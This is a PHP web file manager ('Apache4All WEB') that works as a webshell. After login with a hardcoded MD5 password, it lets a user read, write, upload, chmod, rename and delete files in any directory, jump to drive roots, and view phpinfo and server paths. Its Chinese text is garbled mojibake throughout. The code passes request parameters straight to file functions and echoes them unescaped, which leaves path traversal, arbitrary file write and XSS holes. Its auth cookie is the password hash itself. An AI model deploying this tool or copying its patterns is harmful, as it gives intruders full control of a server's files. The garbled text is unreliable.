<?php

/* =====================��Apache4All WEB���� �������� =================== */

	//--����ʹ�÷�ʽ��"0"Ϊ���õ�½����ʹ�ã�"1"ΪҪ�������Ա�������ʹ�á�
	$set[mode]="1";

	//--����Ա���룺�������õ������Ǿ���MD5���ܵ��ַ��������������롣
	$set[password]="2c17c6393771ee3048ae34d6b380c5ec";

/* ============================  ���ý��� ================================ */


if($_GET[dir]!=""){	 $dir=$_GET[dir];}
elseif($_POST[dir]!=""){ $dir=$_POST[dir];}
else{	$dir="./";}

$style_head="
<HTML><վ��WEB����//-->
<HEAD>
<TITLE>����վ��WEB���� {title}��</TITLE>
<META content='text/html; charset=gb2312' http-equiv=Content-Type>
<META http-equiv=keyword content=Apache4All>

<style type='text/css'>
  A:link    {color:000000; text-decoration: underline}
  A:active  {color:ff3333; text-decoration: underline}
  A:hover   {color:ffffff; text-decoration: underline; LEFT: 1px; POSITION: relative; TOP: 1px}
  A:visited {color:000000; text-decoration: underline}
  body  {FONT-FAMILY:����; font-size=9pt; color:999999}
  TD  {FONT-SIZE: 9pt; color:000000; line-height: 150%}
  INPUT  {FONT-SIZE: 9pt; HEIGHT: 20px; PADDING-BOTTOM: 1px; PADDING-LEFT: 1px; PADDING-RIGHT: 1px; PADDING-TOP: 0px}
  textarea  {FONT-FAMILY:����}
 .menu TD A {COLOR:ffffff; TEXT-DECORATION: none; WIDTH:100%; padding-top:2px}
 .menu TD A:hover {COLOR: 000000; TEXT-DECORATION: none; BACKGROUND-COLOR: bbbbbb; LEFT: 0px; TOP: 0px}
 .menu A:active {COLOR: ffffff; TEXT-DECORATION: none}
 .menu A:visited {COLOR: ffffff; TEXT-DECORATION: none}
</style>

</head>
<BODY BGCOLOR=000000 leftMargin=5 rightMargin=5 topMargin=0>
<DIV align=center>
<table width=750 border=0 bgcolor=666666 cellpadding=0 cellspacing=1 class=menu>
 <tr bgcolor=888888><td title='�аס�http://shangbai.info
������������������+��������
�а� :)'><a href=http://shangbai.info>>>����<font color=ffffff face='Tahoma'>վ�� WEB����</font>����<<</a></td>
<td width=80 align=center title='�ļ�Ŀ¼�б�����'><a href='?'>�ļ�����</a></td>
<td width=80 align=center title='���ɴ�������������'><a href='?m=code'>��������</a></td>
<td width=80 align=center title='����MD5���ܺ���ַ���'><a href='?m=md5'>MD5����</a></td>
<td width=80 align=center title='Unixʱ�任���ͨ��ʱ��'><a href='?m=unixdate'>UNIXʱ��</a></td>
</tr>
</table>
<table width=750 border=0 bgcolor=666666 cellpadding=3 cellspacing=1>
<tr bgcolor=666666><td>����Ա������[<a href='?login=1'><u>��½</u></a>|<a href='?login=3'><u>�˳�</u></a>]<br>��ǰ��Ŀ¼��{$dir}</td><td><font size=3 color=ffffff><b>��ǰ������{title}</b></font></td></tr>
</table>
";


function getmicrotime()
{ //----ִ��ʱ��
  list($usec, $sec) = explode(" ",microtime()); 
  return ($usec + $sec); 
}

function error_info($info,$url="javascript:history.back(1)")
{ //----������ʾ
  echo"<meta http-equiv=refresh content=5;URL='$url'><center><br><br><font size=3 color=ff0000>$info</font></center></td></tr></table>";
  exit;
}

function skin_var($var1,$var2)
{ //----�滻ҳ�����
 global $style_head;
  $style_head=eregi_replace("\{$var1\}",$var2,$style_head);
}

/* ========================== ������������ʼ���� ========================= */


if($_GET[login]=="2"){
/*------------------------ ������룬������Cookie ----------------------*/
	$password=md5($_POST[password]);
	if ( $password != $set[password] ) {
		error_info("������󣡵�½ʧ��</font>");
	}
	$time=time();

	if ( $_POST[yxtime] ==3600)     {$cookie_time=$time+3600;}
	elseif ( $_POST[yxtime] ==10800) {$cookie_time=$time+10800;}
	elseif ( $_POST[yxtime] ==86400)  {$cookie_time=$time+86400;}
	elseif ( $_POST[yxtime] ==2592000) {$cookie_time=$time+2592000;}
	else { $cookie_time=0; }

	setcookie ("boom_baby","$password","$cookie_time","$_SERVER[PHP_SELF]"); 

	echo"<meta http-equiv=refresh content=5;URL='?'><center><br><br>����������ȷ | ��½�ɹ�</center>";
	exit;
}

elseif($_GET[login]=="3"){
/*------------------------------ �˳���½״̬ --------------------------*/
	setcookie ("boom_baby","00","-9999","$_SERVER[PHP_SELF]"); 
	error_info("�Ѿ��˳���½�������Cookie");
}

elseif($_GET[login]=="1"){
/*-------------------------------- ��½���� ----------------------------*/
	echo"<body bgcolor=000000><center><br><br><br><br><br>
<table width=400 border=0 bgcolor=666666 cellpadding=3 cellspacing=1>
 <tr bgcolor=666666><td align=center><font size=3 color=ffffff><b>�ǡ�½���ܡ���</b></font></td></tr>
 <tr bgcolor=eeeeee>
 <form action='?login=2' method=post>
  <td align=center height=80>����Ա���룺<input type='password' name='password' size=19 maxlength=20>
<br><font style='font-size:9pt'>Cookies���ã�</font><select name='yxtime' size=1>
<option value='0'>������</option>
<option value='3600'> 1Сʱ</option>
<option value='10800'>3Сʱ</option>
<option value='86400'>1��</option>
<option value='2592000'>1����</option>
</select><br><input type='submit' value='��½����'></td>
 </form>
 </tr>
</table></center></body>";
	exit;
}

$time_start = getmicrotime();

if (($set[mode]=="1") and ($_COOKIE[boom_baby] != $set[password])) {
	echo"<center><br><br><br><font size=3 color=ff0000>��Ǹ����û�е�½���޷�ʹ�ñ�����</font><hr size=1>
	     <a href='?login=1'>>>�������Ա�����½<<</a></center>";
	exit;
}


 chdir($dir);
 $open=opendir("./");


if($_GET[m]=="show"){
//-------------------------------- �鿴���� --------------------------------
	if($_GET[id] != ""){
		if(file_exists("$_GET[id]")){
			$fp=fopen($_GET[id],r);
			$data=fread($fp,"9999999");
			fclose($fp);

			$data=str_replace("</textarea>","</textarea>",$data);
			$data=str_replace("</textarea>","</textarea>",$data);
			$data=str_replace("<textarea","<textarea",$data);
			$data=str_replace("<textarea","<textarea",$data);

		}
	}

	skin_var(title,"�鿴�༭�ļ�");
	echo"{$style_head}
<table width=750 border=0 bgcolor=666666 cellpadding=2 cellspacing=1>
 <tr bgcolor=eeeeee align=center>
<form method=post action='?m=write&dir={$dir}'>
  <td height=100>
�ļ�����<input type=text name=id value='{$_GET[id]}' size=30 maxlength=30><br>
<textarea name='data' cols=100 rows=20>{$data}</textarea>
<input type=hidden name='dir' value='{$dir}'><input type='submit' value='ȷ���޸ı���'>
</td></tr></form>
<tr bgcolor=888888 align=center><td>
<table width=700 border=0  style='border: solid 1; border-color: 666666'><tr><td>
<center>�ɱ༭txt/html/css/js/php/cgi/asp/jsp�������ı����ļ�</center>
<font color=ff0000>ע�⣺</font>�����༭�ļ� < 9MB
<br>���ڳ���ʹ�á�<font color=0000ff><textarea></textarea></font>����ǩ����ʾ�༭�ļ����ݣ�Ϊ�˱������ͻ��������
<br>�������ʾ�༭���ļ����С�<font color=0000ff><textarea></textarea></font>����ǩ��
<br>������Զ�����<font color=0000ff><textarea</font>��ת���ɡ�<font color=00ff00><textarea</font>������<font color=0000ff></textarea></font>��ת���ɡ�<font color=00ff00></textarea></font>����ʾ������
<br>���ļ�����ʱ������Զ��ٽ���<font color=00ff00><textarea</font>����ԭ�ء�<font color=0000ff><textarea</font>������<font color=00ff00></textarea></font>����ԭ�ء�<font color=0000ff></textarea></font>����
<br>-----�ش�����ʹ���ߣ�����
</td></tr></table>
</td></tr></table>";
}



elseif($_GET[m]=="write"){
//-------------------------------- д�ļ� --------------------------------
	$data=stripslashes($_POST[data]);
	$data=str_replace("</textarea>","</textarea>",$data);
	$data=str_replace("<textarea","<textarea",$data);

	skin_var(title,"д���ļ�");
	echo"{$style_head}
<table width=750 border=0 bgcolor=666666 cellpadding=2 cellspacing=1>
 <tr bgcolor=eeeeee align=center>
  <td height=100>";
	if($data != ""){
		$fp=fopen($_POST[id],"w");
		flock($fp,LOCK_EX);
		$data=str_replace("\r","",$data);
		fputs($fp,$data);
		fclose($fp);
	
		echo"<meta http-equiv=refresh content=5;URL='?dir={$dir}'><p><b>�ļ���<font size=3 color=ff0000>{$_POST[id]}</font>������ϣ�</b>";
	}
	else{echo"<meta http-equiv=refresh content=5;URL='javascript:history.back(1);'><font size=3 color=ff0000>��������Ҫ�޸ĵ��ļ�����</font>";}
	echo"</td></tr></table>";
}




elseif($_GET[m]=="mkdir"){
//------------------------------ ������Ŀ¼ -------------------------------
	skin_var(title,"������Ŀ¼");
	echo"{$style_head}
<table width=750 border=0 bgcolor=666666 cellpadding=2 cellspacing=1>
 <tr bgcolor=eeeeee align=center>
  <td height=100>";

	if($_GET[id] != ""){
		if(!file_exists($_GET[id])){mkdir($_GET[id],0755);echo"<meta http-equiv=refresh content=5;URL='?dir={$dir}'>Ŀ¼��<font size=3 color=ff0000>{$_GET[id]}</font>�������ɹ�<br><br>����5���Ӻ��Զ����ز鿴";}
		else{echo"<meta http-equiv=refresh content=5;URL='javascript:history.back(1);'>Ŀ¼��<font size=3 color=ff0000>{$_GET[id]}</font>���Ѿ�����";}
	}
	else{echo"<meta http-equiv=refresh content=5;URL='javascript:history.back(1);'><font size=3 color=ff0000>��������Ҫ�´�����Ŀ¼����</font>";}
	echo"</td></tr></table>";
}




elseif($_GET[m]=="md5"){
//-------------------------- ������MD5���ܵ��ַ� ---------------------------
	skin_var(title,"��������ܵ��ַ�");
	echo"{$style_head}
<table width=750 border=0 bgcolor=666666 cellpadding=2 cellspacing=1>
<form method='post' action='?m=showmd5'>
 <tr bgcolor=eeeeee align=center>
  <td height=100>
��Ҫ���ܵ��ַ���<input type=text name=word size=30 maxlength=30>
<input type='submit' value='ȷ��'>
  </td></tr></form></table>";
}




elseif($_GET[m]=="showmd5"){
//------------------------------ ��ʾMD5���ܺ� -----------------------------
	$word=md5($_POST[word]);
	skin_var(title,"��ʾMD5���ܺ���ַ���");
	echo"{$style_head}
<table width=750 border=0 bgcolor=666666 cellpadding=2 cellspacing=1>
 <tr bgcolor=eeeeee align=center>
  <td height=100>
<font color=ff0000>����MD5���ܺ����ɵ��ַ�����</font><input type=text name='word' value='$word' size=40 maxlength=50 readonly>
  </td></tr></table>";
}





elseif($_GET[m]=="code"){
//-------------------------------- �������� --------------------------------
	skin_var(title,"�������");
	echo"{$style_head}
<table width=750 border=0 bgcolor=eeeeee cellpadding=2 cellspacing=1>
<tr><td align=center height=150>
	<table width=500 border=0 bgcolor=bbbbbb cellpadding=3 cellspacing=1>
	<tr><td bgcolor=eeeeee>
������ܵ��ô��������ɴ���������������롣
<br>�ٸ�������˵�ɣ�
<br>���Ҫ����վ�����м��ϡ�http://qxbbs.org/����ַ�´ӡ�001.gif������100.gif����ͼƬ��
���ѵ���Ҫ�ֹ�һ����������Ǳ�д���룿
<br>�����ֹ���д�����������������ܡ��ó����Լ���������������������д�޸ġ�
<br><br>��������Ҫ����ֻ�����ú���Ҫ���ַ���/Ҫ�仯���ֵ���Сֵ/���ֵ/��
<br>�ȳ������ɺ������ٿ��������OK����
	</td></tr></table>
<hr size=1 color=cccccc>
 <form method='post' action='?m=showcode'>
ǰ���ַ���<input type=text name='string_q' size=50 maxlength=80 value='http://qxbbs.org/'>
<br>
��ʼ����<input type=text name='minimum' size=3 maxlength=3 value='1'>
�������<input type=text name='max' size=3 maxlength=3 value='100'>
<br>
���ַ���<input type=text name='string_h' size=50 maxlength=80 value='.gif'>
<br>
<input type='submit' value='��ʼ����'>
</form>
</td></tr></table>";
}




elseif($_GET[m]=="showcode"){
//-------------------------------- ��ʾ�����ɴ��� --------------------------------
	$all=$_POST[max]-$_POST[minimum]+1;
	skin_var(title,"��ʾ����");
	echo"{$style_head}
<table width=750 border=0 bgcolor=666666 cellpadding=2 cellspacing=1>
 <tr bgcolor=eeeeee align=center>
  <td height=100><b>{$_POST[minimum]}</b> �� <b>{$_POST[max]}</b> �� <b>{$all}</b> ��<br>
<textarea name='data' cols=80 rows=19>";

	$len=strlen($_POST[minimum]);
	for ($i=$_POST[minimum]; $i<=$_POST[max]; $i++) {
		$num=$i;
		$x=$len-strlen($i);
		for($x; $x>0; $x--) {$num="0".$num;}
		echo(stripslashes("{$_POST[string_q]}{$num}{$_POST[string_h]}\n"));
	} 
  	echo"</textarea></td></tr></table>";
}




elseif($_GET[m]=="unixdate"){
//------------------------------- unixʱ�任�� --------------------------------
	skin_var(title,"UNIXʱ�任��");
	echo"{$style_head}
<table width=750 border=0 bgcolor=666666 cellpadding=2 cellspacing=1>
 <tr bgcolor=eeeeee align=center>
  <td height=100>
<br>�������UNIXʱ�����ת��Ϊͨ�ù�Ԫ������ʱ����
<br>���磺1067762599 ����Ϊ 2003��11��02�� 16ʱ11��19��
<hr size=1>
<form method='post' action='?m=showdate'>����UNIXʱ����ǣ�<input type=text name=data size=20 maxlength=20><input type='submit' value='��ʼ����'></form>
<hr size=1>ע��UNIXʱ���Ǵ� 1970��1��1��8ʱ1��0�� Ϊ��ʼ������Ϊ��λ��10������ֵ��
</td></tr>
</table>";
}



elseif($_GET[m]=="showdate"){
//------------------------------ unixʱ��ת��ͨ��ʱ�� -----------------------------
	$date=date("Y��m��d�� Hʱm��s��",$_POST[data]);

	skin_var(title,"UNIXʱ��ת��ͨ��ʱ��");
	echo"{$style_head}
<table width=750 border=0 bgcolor=666666 cellpadding=2 cellspacing=1>
 <tr bgcolor=eeeeee align=center>
  <td height=100>ʱ�䣺<font size=3>$date</font>
  </td></tr></table>";
}



elseif($_POST[m]=="����"){
//-------------------------------- �������� --------------------------------
	skin_var(title,"��������ֵ");
	echo"{$style_head}
<table width=750 border=0 bgcolor=666666 cellpadding=2 cellspacing=1>
    <tr bgcolor=eeeeee><td align=center height=100>";

	if(!$_POST[id][0]){error_info("û��ѡ��Ҫ�޸����Ե���Ŀ");}

	while ( list($key, $val) = each($_POST[id]) ) {
		if($key=="0"){$items=$_POST[id][$key];}
		else{$items=$items."|".$_POST[id][$key];}
	}

	echo"
    <form action='?m=chmod&dir={$dir}' method=post><br>����ֵ��
	<input type='text' name='val' value='0755' size=4 maxlength=4>
	<input type='hidden' name='items' value='{$items}'>
	<input type=submit value='ȷ���޸�'>
    </td>
    </tr></form>
</table>";
}



elseif($_GET[m]=="chmod"){
//-------------------------------- �޸����� --------------------------------

#	$val=(integer)$_POST[val];
#	echo"{$_POST[val]}|".gettype($_POST[val])."<br>{$val}|".gettype($val)."<br>";

	skin_var(title,"�޸�����");
	echo"{$style_head}
<table width=750 border=0 bgcolor=666666 cellpadding=2 cellspacing=1>
 <tr bgcolor=eeeeee align=center>
  <td height=100>";
	if(!$_POST[items]){error_info("!û��ѡ����Ҫ�޸����Ե�Ŀ��!");}

	$id = explode("|",$_POST[items]);
	$val=base_convert($_POST[val],8,10);
#	$val=base_convert($val,10,8);
	for($i=0; $i<count($id); $i++){
		if(chmod($id[$i],$val)){echo"�޸ġ�<font color=ff0000>{$id[$i]}</font>������Ϊ[<font color=ff0000>{$_POST[val]}</font>]�ɹ�<br>";}else{;echo"��<font color=ff0000>{$id[$i]}</font>���޸�����ʧ��<br>";}
	}
	echo"</td></tr></table>";
}



elseif($_POST[m]=="����"){
//-------------------------------- ����ȷ�� --------------------------------
	if(!$_POST[id][0]){error_info("!û��ѡ����Ҫ������Ŀ��!");}

	skin_var(title,"����ȷ��");
	echo"{$style_head}
<table width=750 border=0 bgcolor=666666 cellpadding=2 cellspacing=1>
 <tr bgcolor=eeeeee align=center>
  <td height=100>
    <form action='?m=rename&dir={$dir}' method=post><br>
�ļ�/Ŀ¼��<input type='text' name='id' value='{$_POST[id][0]}' size=20 readonly><br>
�� ����Ϊ��<input type='text' name='newname' size=20 maxlength=20><br>
	<input type=submit value='ȷ������'>
    </td>
    </tr></form></td></tr></table>";
}



elseif($_GET[m]=="rename"){
//-------------------------------- �޸����� --------------------------------
	if((!$_POST[id]) or (!$_POST[newname])){error_info("!��ѡ����Ҫ������Ŀ�꣬������������!");}

	skin_var(title,"�޸�����");
	echo"{$style_head}
<table width=750 border=0 bgcolor=666666 cellpadding=2 cellspacing=1>
 <tr bgcolor=eeeeee align=center>
  <td height=100>";

	if(rename ($_POST[id],$_POST[newname])){echo"<font size=3>�����ɹ�</font>";}
	else{echo"<font size=3 color=ff0000>��������ʧ��</font>";}
	echo"</td></tr></table>";
}



elseif($_POST[m]=="ɾ��"){
//-------------------------------- ɾ��ȷ�� --------------------------------
	skin_var(title,"ɾ������ȷ��");
	echo"{$style_head}
<table width=750 border=0 bgcolor=666666 cellpadding=2 cellspacing=1>
 <tr bgcolor=eeeeee align=center>
  <td height=100>";

	if(!$_POST[id][0]){error_info("û��ѡ��Ҫɾ������Ŀ<br>");}
	$id_all=count($_POST[id]);

	echo"<table width=300 border=0 bgcolor=cccccc cellpadding=3 cellspacing=1>";

	while ( list($key, $val) = each($_POST[id]) ) {
		if($key=="0"){$items=$_POST[id][$key];}
		else{$items=$items."|".$_POST[id][$key];}

		if(is_dir($_POST[id][$key])){$info1="Ŀ¼";}else{$info1="�ļ�";}
		if((is_writeable($_POST[id][$key]))==1){$info2="��ɾ";}else{$info2="<font color=ff0000>����ɾ</font>";}
		echo"<tr bgcolor=eeeeee><td>{$_POST[id][$key]}</td><td align=center>$info1</td><td align=center>$info2</td></tr>";
	}

	echo"</td></tr></table>
<hr size=1>
<font color=ff0000>�ٴ������������·�������������������Ҫ����ʧ��</font><br><font size=3><b>ȷ��ɾ������ȫ�� <font color=ff0000>{$id_all}</font> �</b></font>
    <form action='?m=del&dir={$dir}' method=post>
	<input type='hidden' name='items' value='$items'>
	<input type=submit value='ȷ��ɾ��'>
</form>
<hr size=1>��ɾ��Ŀ¼��������Զ�ɾ��Ŀ¼��һ�����ļ��Ϳ�Ŀ¼��������������Ŀ¼���ļ���
</td></tr></table>";
}



elseif($_GET[m]=="del"){
//-------------------------------- ��ʼɾ�� --------------------------------
	skin_var(title,"ɾ������");
	echo"{$style_head}
<table width=750 border=0 bgcolor=666666 cellpadding=2 cellspacing=1>
 <tr bgcolor=eeeeee align=center>
  <td height=100>
    <table border=0><tr><td>";

	if(!$_POST[items]){error_info("û��ѡ��Ҫɾ������Ŀ");}
	$id = explode("|",$_POST[items]); 
	$i_all=count($id);
	echo"ɾ����Ŀ����:$i_all<hr>";

	for($i=0; $i < $i_all; $i++){
		if(is_dir($id[$i])){

			chdir($id[$i]);
			$open=opendir("./");
			for($ii=0; $filename=readdir($open); $ii++){
				if(is_dir($filename)){
				if(($filename!=".") and ($filename!="..")){ rmdir($filename);}
				}
				else{ unlink($filename);}
			}
			chdir("../");
			$open=opendir("./");

			if(@rmdir($id[$i])){echo"ɾ��Ŀ¼��<b>{$id[$i]}</b><br>";}
			else{echo"<font color=ff0000>ɾ��Ŀ¼<b>{$id[$i]}ʧ��</b></font><br>";}
			
		}
		else{
			if(@unlink($id[$i])){echo"ɾ���ļ���<b>{$id[$i]}</b><br>";}
			else{echo"<font color=ff0000>ɾ���ļ�<b>{$id[$i]}</b>ʧ�ܣ�</font><br>";}
		}
	}

 echo"
    </td></tr></table></td></tr></table>";
}




elseif($_GET[m]=="help"){
//-------------------------------- ����˵�� --------------------------------

 $phpver=phpversion();
 $os=PHP_OS;
 $df=round(diskfreespace("/")/1048576);
 if (get_cfg_var("safe_mode")){$safe_mode="����";}else{$safe_mode="�ر�";}
 $upfile_max = get_cfg_var("upload_max_filesize");
 $scriptouttime = get_cfg_var("max_execution_time");
 if (get_cfg_var("register_globals")){$register_globals ="On";}else{$register_globals ="Off";}
 $post_max_size = get_cfg_var("post_max_size");
 $memory_limit= get_cfg_var("memory_limit");

	skin_var(title,"��Ϣ˵��");
	echo"{$style_head}
<table width=750 border=0 bgcolor=666666 cellpadding=2 cellspacing=1>
 <tr bgcolor=eeeeee>
  <td height=100><font size=3><center>
�ҵ�IP��ַ��{$_SERVER[REMOTE_ADDR]}</center></font><br>
   <table border=0 bgcolor=aaaaaa cellpadding=1 cellspacing=1 align=center>
<tr bgcolor=cccccc><td colspan=2 align=center>����Ϣ��</td></tr>
<tr bgcolor=eeeeee><td colspan=2>{$_SERVER[SERVER_SIGNATURE]}</td></tr>
<tr bgcolor=eeeeee><td>����ϵͳ</td><td>{$os}</td></tr>
<tr bgcolor=eeeeee><td>PHP �汾</td><td>{$phpver}</td></tr>
<tr bgcolor=eeeeee><td>����������</td><td>{$_SERVER[SERVER_SOFTWARE]}</td></tr>
<tr bgcolor=eeeeee><td>����ʣ��ռ�</td><td>{$df} MB</td></tr>
<tr bgcolor=eeeeee><td>WWW����Ĭ��·��</td><td>{$_SERVER[DOCUMENT_ROOT]}</td></tr>
<tr bgcolor=eeeeee><td>��ǰ��������·��</td><td>{$_SERVER[SCRIPT_FILENAME]}</td></tr>
<tr bgcolor=eeeeee><td>��ǰ��������·��</td><td>{$_SERVER[PATH_TRANSLATED]}</td></tr>
<tr bgcolor=cccccc><td colspan=2 align=center>PHP.ini������Ϣ��</td></tr>
<tr bgcolor=eeeeee><td>��ȫģʽ</td><td>{$safe_mode}</td></tr>
<tr bgcolor=eeeeee><td>�Զ�ȫ�ֱ���</td><td>{$register_globals}</td></tr>
<tr bgcolor=eeeeee><td>����ϴ��ļ�</td><td>{$upfile_max}</td></tr>
<tr bgcolor=eeeeee><td>���POST����</td><td>{$post_max_size}</td></tr>
<tr bgcolor=eeeeee><td>���ʹ���ڴ�</td><td>{$memory_limit}</td></tr>
<tr bgcolor=eeeeee><td>�ű���ʱʱ��</td><td>{$scriptouttime} sec</td></tr>
<tr bgcolor=cccccc><td colspan=2 align=center>[<a href='?m=phpinfo'><font color=ff0000>Phpinfo ��ϸ��Ϣ��</font></a>]</td></tr>
   </table>
<br>
<br><br><b>���ܽ��ܣ�</b>
<li>���������������㹻Ȩ�޵�Ŀ¼�����г�Ŀ¼�µ��ļ�����Ŀ¼��Ϣ��
<li>�����ļ��Ƿ���Զ�д��1Ϊ�ɣ�0Ϊ��
<li>�ڿɶ�������£��ܲ鿴�ļ������ݡ��������ļ����������Ϣ��
<li>�ڿ�д������£��ܹ����ϴ��ļ��������޸����ԡ������ļ������������༭�ļ��������½��ļ��������½�Ŀ¼����
<li>������ɾ���ļ��Ϳ�Ŀ¼�����������޸��ļ���Ŀ¼���ԡ���
<li>[MD5�����ַ�]��[������������]��[UNIXʱ�������]��
<li>���⻹�ɷ���ϵͳ������Ϣ��
<li>����Ա��½���ܡ�
<li>�Ժ�����Ӹ��������뵽��ʵ�ù��ܡ�
<br><br><b>ע�����</b>
<li><font color=ff0000>���������������ֱ��ʹ�á������ڹ���ǿ�������Σ���ԣ����������������ֻ�����Լ�֪���ĵط��������������ʹ�ã�</font>
<li><font color=ff0000>ʹ�ñ�����Ҳ�����ĳЩ�������е�������Ϣ�����������Ƿ���;���������Ը��� </font>
<li>���ڷ��������ø�����ͬ���޷���֤��ʹ��ʱ�������ȫ�����ܶ���Ч������ĳЩ�����޷�����ִ�У����ش�����ϢҲ����֡� 
<li>��Ҫɾ���ļ���Ŀ¼�����Ȱ�Ҫɾ��Ŀ�����ڵ�Ŀ¼���Ը�Ϊ777����ȷ���ɹ���

<hr size=1>
<p align=right>�����޸ģ����ơ���2004-09-12
</td></tr></table>";
}



elseif($_GET[m]=="phpinfo"){
	phpinfo();
	exit;
}


elseif($_GET[m]=="upfile"){
//-------------------------------- �ļ��ϴ� --------------------------------
	if ($_FILES[upfile][name]==""){error_info("!��ѡ��Ҫ�ϴ����ļ�!<br>��Ȼ����ô֪����Ҫ�ϴ���һ�����裡");}
	if (file_exists($_FILES[upfile][name])) {error_info("��Ŀ¼������ͬ���ļ����������");}

	move_uploaded_file($_FILES[upfile][tmp_name],$_FILES[upfile][name]);

	skin_var(title,"�ļ��ϴ�");
	echo"{$style_head}
<table width=750 border=0 bgcolor=666666 cellpadding=2 cellspacing=1>
 <tr bgcolor=eeeeee>
  <td height=200 align=center>
<b><font size=3>�ļ���<font color=ff0000>{$_FILES[upfile][name]}</font>���ϴ���ϣ�</font></b>
<br>
�ļ���С��{$_FILES[upfile][size]} Byte
<hr size=1 width=400>
��ע��ĳЩ����¿�����Ҫ�ϴ�2�β��ܳɹ���
</td></tr></table>
<meta http-equiv=refresh content=7;URL='?dir={$dir}'>";
}



else{
//-------------------------------- Ŀ¼�б� --------------------------------
	if($_GET[showtype]==""){ $showname="�����ļ���Ŀ¼";}
	elseif($_GET[showtype]=="directory"){ $showname="����Ŀ¼";}
	else{ $showname="<b><font face='Tahoma'>*.{$_GET[showtype]}</font></b> �ļ�";}

	skin_var(title,"Ŀ¼�б�");
	echo"{$style_head}
<table width=750 border=0 bgcolor=666666 cellpadding=2 cellspacing=1>
 <tr bgcolor=888888 align=center><td></td>
  <form method='get'>
  <td><table width=100% border=0 cellpadding=0 cellspacing=0><tr><td><font color=ffffff>��{$showname}</font></td><td align=right>
	<select name='showtype' size=1 onchange=\"window.location=('?dir={$dir}&showtype='+this.options[this.selectedIndex].value+'');\">
	 <option style='BACKGROUND-COLOR: aaaaaa; color=ffffff'>��ʾ����</option>
	 <option value=''>ȫ����ʾ</option>
	 <option value='directory'>< Ŀ¼ ></option>
	 <option value='html'>*.html</option>
	 <option value='htm'>*.htm</option>
	 <option value='txt'>*.txt</option>
	 <option value='cgi'>*.cgi</option>
	 <option value='php'>*.php</option>
	 <option value='asp'>*.asp</option>
	 <option value='jsp'>*.jsp</option>
	 <option value='dat'>*.dat</option>
	 <option value='swf'>*.swf</option>
	 <option value='gif'>*.gif</option>
	 <option value='jpg'>*.jpg</option>
	 <option value='png'>*.png</option>
	 <option value='zip'>*.zip</option>
	 <option value='rar'>*.rar</option>
	</select></td></tr></table>
  </td></form>
  <td><font color=ffffff>�ļ���С</font></td>
  <td><font color=ffffff>����ʱ��</font></td>
  <td><font color=ffffff>�޸�ʱ��</font></td>
  <td><font color=ffffff>�� ��</font></td>
  <td><font color=ffffff>�ɶ�</font></td>
  <td><font color=ffffff>��д</font></td>
  <td><font color=ffffff>������</font></td>
 </tr><form method='post'>\n";

 for($i=0; $filename=readdir($open); $i++){
	if(is_dir($filename)){
		if(($_GET[showtype]!="") and ($_GET[showtype]!="directory")){continue;}

		if(($filename==".") or ($filename=="..")){echo"<tr bgcolor=dddddd align=center><td></td><td align=left><font color=ff9900>[<a href='?dir={$dir}$filename/'>$filename</a>]</font></td>";}
		else{echo"<tr bgcolor=dddddd align=center><td><input type='checkbox' name='id[]' value='$filename'></td><td align=left><font color=ff9900>[<a href='?dir={$dir}$filename/'>$filename</a>]</font></td>";}
		$fileinfo[2]="<td>< Ŀ¼ >";
		$dir_i++;
	}
	else{
		if($_GET[showtype]=="directory"){continue;}
		elseif($_GET[showtype]!=""){
			if(strtolower($_GET[showtype]) != strtolower(substr(strrchr($filename,"."),1))){continue;}
		}

		echo"<tr bgcolor=eeeeee align=center><td><input type='checkbox' name='id[]' value='$filename'></td><td align=left><table width=100% border=0 cellpadding=0 cellspacing=0><tr><td><a href='{$dir}".urlencode($filename)."'>$filename</a></td><td align=right><a href='?m=show&id={$filename}&dir={$dir}'>�鿴</a></td></tr></table></td>";
		$fileinfo[2]="<td align=right>".filesize("{$filename}");
		$file_i++;
	}

	echo"{$fileinfo[2]}</td><td>".date("y-m-d H:i",filectime("$filename"))."</td><td>".date("y-m-d H:i",filemtime("$filename"))."</td><td>".substr(decoct(fileperms("$filename")),-3)."</td><td>".is_readable($filename)."</td><td>".is_writeable($filename)."</td><td>".fileowner("{$filename}")."</td></tr>\n";
 }
 echo"<tr bgcolor=888888><td colspan=3>
<input type=hidden name='dir' value='{$dir}'>
<input type='submit' name='m' value='ɾ��'>
<input type='submit' name='m' value='����'>
<input type='submit' name='m' value='����'>
</td>
</form>
<td colspan=6 align=center>�ܹ���{$i}���ļ���Ŀ¼����Ŀ¼����{$dir_i}�����ļ�����{$file_i}</td></tr>
</table>";
}


/* ================================ ����β����ʽ ========================= */
$time_end = getmicrotime();
$alltime=$time_end-$time_start;
echo"
<table width=750 border=0 bgcolor=666666 cellpadding=3 cellspacing=0>
 <tr bgcolor=666666>
<form action='?m=upfile&dir={$dir}' method='post' enctype='multipart/form-data'>
  <td><input type='file' name='upfile' size=18><input type='submit' value='�ϴ��ļ�'></td>
</form>
  <td> <a href='?dir=c:/'>[C:]</a> <a href='?dir=d:/'>[D:]</a> <a href='?dir=e:/'>[E:]</a> |<a href='?m=help'>˵��</a>|</td>
<form method='get'>
  <td align=right><select name='m' size=1>
			<option value='mkdir'>�½�һ��Ŀ¼</option>
			<option value='show'>�½�һ���ļ�</option>
</select><input type=hidden name='dir' value='{$dir}'><input type=text name=id size=15 maxlength=15><input type=submit value='ȷ������'></td>
 </tr>
</form>
</table>
<table width=750 border=0 cellpadding=3 cellspacing=1>
 <tr align=center>
  <td align=left>
<font color=666666>����ִ��ʱ�䣺{$alltime} s</font>
  </td><td align=right>
<font color=777777 face='Tahoma'>...:::::www.qxbbs.org</font></td>
 </tr>
</table>
</DIV>
</BODY>
</HTML>";

?>